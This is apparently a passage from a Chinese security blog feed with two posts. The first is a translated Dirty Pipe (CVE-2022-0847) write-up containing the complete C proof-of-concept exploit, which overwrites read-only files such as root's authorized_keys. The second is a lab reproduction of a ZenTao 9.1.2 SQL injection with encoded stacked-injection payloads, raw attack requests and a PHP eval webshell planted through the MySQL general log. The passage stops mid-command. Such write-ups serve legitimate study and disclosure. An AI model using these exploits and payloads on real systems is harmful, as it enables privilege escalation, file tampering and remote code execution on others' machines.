cache中。<br>但为什么只有头8个字节？实际上，所有的头都会被复制到页面缓存中，但这个操作不会增加文件大小。原始文件末尾只有8个字节的“未拼接”空间，只有这些字节可以被覆盖。从page cache的角度来看，这一个page的其余部分是未使用的（尽管管道缓冲区代码确实使用它，因为它有自己的页面填充管理）。<br>为什么这种情况不经常发生？因为页面缓存不会写回磁盘，除非它认为页面是“脏”的。意外覆盖页面缓存中的数据不会使页面“脏”。如果没有其他进程“弄脏”文件，则此更改将是短暂的；在下一次重新启动后（或者在内核决定从缓存中删除页面后，比如在内存压力下回收页面），更改将被恢复。这使得有趣的攻击不会在硬盘上留下痕迹。</p><h1 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h1><p>在我的第一个EXP中（我用于bisect的“writer”/“splicer”程序），我假设只有在特权进程写入文件时，才能利用这个漏洞，并且它取决于时间。<br>当我意识到真正的问题是什么时，我能够将漏洞扩大很大一部分：即使在没有写入权限的情况下，也有可能覆盖page cache，而不受时间限制，在(几乎)任意位置的任意数据上。这些限制是：</p><ul><li>攻击者必须具有读取权限（因为它需要将<code>splice()</code> 一个page到一个管道中）。</li><li>偏移量不得位于页面边界上（因为该页的至少一个字节必须拼接到管道中）。</li><li>写入不能跨越页面边界（因为将为剩余部分创建新的匿名缓冲区）。</li><li>无法调整文件大小（因为管道有自己的页面填充管理，并且不会告诉page cache添加了多少数据）<br>要利用此漏洞，您需要：</li></ul><ol><li>创建一个管道。</li><li>用任意数据填充管道（在所有环入口中设置<code>PIPE_BUF_FLAG_CAN_MERGEE</code>flag）。</li><li>排空管道（在<code>struct pipe_inode_info</code>环上的所有<code>struct pipe_buffer</code>实例中保留设置的flag）。</li><li>将目标文件（仅用<code>O_RDONLY</code>打开）中的数据从目标偏移之前拼接到管道中。</li><li>将任意数据写入管道；此数据将覆盖缓存的文件页，而不是创建新的匿名<code>struct pipe_buffer</code>，因为设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 的flag<br>为了使此漏洞更有趣，它不仅可以在没有写权限的情况下工作，还可以在不可修改文件、只读btrfs快照和只读挂载（包括CD-ROM挂载）上工作。这是因为页面缓存始终是可写的（由内核），而写入管道永远不会检查任何权限。<br>这是我的概念证明：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepare_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">pipe</span>(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> pipe_size = <span class="hljs-built_in">fcntl</span>(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">   leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">read</span>(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">   will be mergeable */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* dumb command-line argument parser */</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> path = argv[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">loff_t</span> offset = <span class="hljs-built_in">strtoul</span>(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> data = argv[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br><span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> end_offset = offset + (<span class="hljs-keyword">loff_t</span>)data_size;<br><span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* open the input file and validate the specified offset */</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;open failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">fstat</span>(fd, &amp;st)) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;stat failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>];<br><span class="hljs-built_in">prepare_pipe</span>(p);<br><br><span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>--offset;<br><span class="hljs-keyword">ssize_t</span> nbytes = <span class="hljs-built_in">splice</span>(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;splice failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">   will instead write into the page cache, because of the</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>nbytes = <span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], data, data_size);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;write failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">size_t</span>)nbytes &lt; data_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short write\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><ul><li>2021-04-29: 收到第一封关于文件损坏的工单</li><li>2022-02-19: 文件损坏问题被确定为Linux内核错误，这是一个可利用的漏洞</li><li>2022-02-20: 向Linux内核安全团队发送<a href="https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html">错误报告、漏洞攻击和补丁</a></li><li>2022-02-21: 谷歌Pixel 6上重现的漏洞；发送给安卓安全团队的错误报告</li><li>2022-02-21: 按照Linus Torvalds、Willy Tarreau和Al Viro的建议，将补丁发送给<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">LKML（无漏洞详细信息）</a></li><li>2022-02-23: Linux稳定版修复了我的漏洞（<a href="https://lore.kernel.org/stable/1645618039140207@kroah.com/">5.16.11</a>、<a href="https://lore.kernel.org/stable/164561803311588@kroah.com/">5.15.25</a>、<a href="https://lore.kernel.org/stable/164561802556115@kroah.com/">5.10.102</a>）</li><li>2022-02-24: 谷歌将我的漏洞修复程序合并到<a href="https://android-review.googlesource.com/c/kernel/common/+/1998671">Android内核</a>中</li><li>2022-02-28: 通知<a href="https://oss-security.openwall.org/wiki/mailing-lists/distros#how-to-use-the-lists">linux发行版邮件</a></li><li>2022-03-07: 公开披露列表</li></ul>]]></content>
    
    
    <categories>
      
      <category>文档翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文档翻译</tag>
      
      <tag>CVE-2022-0847</tag>
      
      <tag>Dirty Pipe提权漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>禅道zentaopms-9.1.2-sql SQL注入</title>
    <link href="/2022/03/12/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/12/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><em>禅道 项目管理软件 是国产的开源项目管理软件,专注研发项目管理,内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能,实现了软件的完整生命周期管理。 漏洞出现在zentao\lib\base\dao\dao.class.php中的orderBy函数没有对limit部分做任何限制就直接拼接。也就是说，使用了orderBy这个函数的地方都有可能产生过滤。</em></p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>该漏洞环境已整合到vulfocus靶场中，可一键直接启动。 </p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled.png" alt="Untitled"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol><li>获取目标版本信息：<a href="http://118.193.36.37:10363/zentaopms/www/index.php?mode=getconfig">http://118.193.36.37:10363/zentaopms/www/index.php?mode=getconfig</a><ol><li>{“version”:”9.1.2”,”requestType”:”GET”,”requestFix”:”-………………</li></ol></li><li>通过错误路由引发报错，进而获取服务器绝对路径：<a href="http://118.193.36.37:10363/zentaopms/www/index.php?m=user&amp;f=login1">http://118.193.36.37:10363/zentaopms/www/index.php?m=user&amp;f=login1</a><ol><li>/www/zentaopms/framework/base/router.class.php</li></ol></li><li>漏洞点：orderBy处理过程中存在SQL注入问题，可堆叠注入。拿其中一个payload演示编码步骤如下：<ol><li>选择所用payload语句：<code>select sleep(5)</code></li><li>将SQL语句hex编码：<code>0x73656c65637420736c656570283529</code></li><li>将hex编码后的参数插入json中：<code>&#123;&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656c65637420736c656570283529;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code></li><li>将json数据进行base64编码：<code>eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</code></li><li>将base64编码后的数据插入请求：<a href="http://118.193.36.37:10363/zentaopms/www/index.php%EF%BC%9Fm=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==">http://118.193.36.37:10363/zentaopms/www/index.php%EF%BC%9Fm=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</a></li><li>注：每一个请求中都需要手动添加refer字段：<code>Referer:http://118.193.36.37:10363/zentaopms/</code></li></ol></li><li>获取webshell过程的payload如下：（采用的是日志写shell的方式）<ol><li>开启日志：<code>set global general_log=&#39;on&#39;;</code> </li><li>更改日志路径：<code>set global general_log_file=&#39;/www/zentaopms/module/misc/ext/model/foo.php&#39;;</code> </li><li>注入shell语句：<code>select &#39;&lt;?php @eval($_POST[1])?&gt;&#39;;</code> </li><li>关闭日志:<code>set global general_log=&#39;off&#39;;</code></li></ol></li><li>访问webshell获取flag：链接：<a href="http://118.193.36.37:10363/zentaopms/module/misc/ext/model/foo.php">http://118.193.36.37:10363/zentaopms/module/misc/ext/model/foo.php</a> 密码：1</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//sleep（5）</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//开启日志：set global general_log=&#x27;on&#x27;; </span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2ZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//更改日志路径：set global general_log_file=&#x27;/www/zentaopms/module/misc/ext/model/foo.php&#x27;; </span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjc1ZjY2Njk2YzY1M2QyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjZkNmY2NDc1NmM2NTJmNmQ2OTczNjMyZjY1Nzg3NDJmNmQ2ZjY0NjU2YzJmNjY2ZjZmMmU3MDY4NzAyNzNiO1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9 HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//注入shell语句：select &#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[1])<span class="hljs-meta">?&gt;</span>&#x27;;</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTZjNjU2Mzc0MjAyNzNjM2Y3MDY4NzAyMDQwNjU3NjYxNmMyODI0NWY1MDRmNTM1NDViMzE1ZDI5M2YzZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//关闭日志:set global general_log=&#x27;off&#x27;;</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2NjY2MjczYjtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%201.png" alt="Untitled"></p><h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><ol><li>为什么不用select…into file方式getshell？网上教程绝大部分用这种方式，但是此靶场不行，详见后文select …into file处</li><li>为什么用哪个foo.php路径？因为只有特定的文件路径可以。详见后文general_log处的坑一坑二</li><li>为什么用预处理方式？系统有过滤一些敏感符号，预处理中可利用hex编码绕过，详见补充部分</li><li>为什么请求中一定要加refer？系统有校验这个请求头，详见补充部分</li></ol><h1 id="详细讲讲TL-DR"><a href="#详细讲讲TL-DR" class="headerlink" title="详细讲讲TL;DR"></a>详细讲讲TL;DR</h1><p>由于在线 Vulfocus的靶机存在时间限制，故选择自行搭建靶机。同时由于自行搭建，故可以进入靶机然后分析。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><ol><li>拉取官方镜像：<code>sudo docker pull 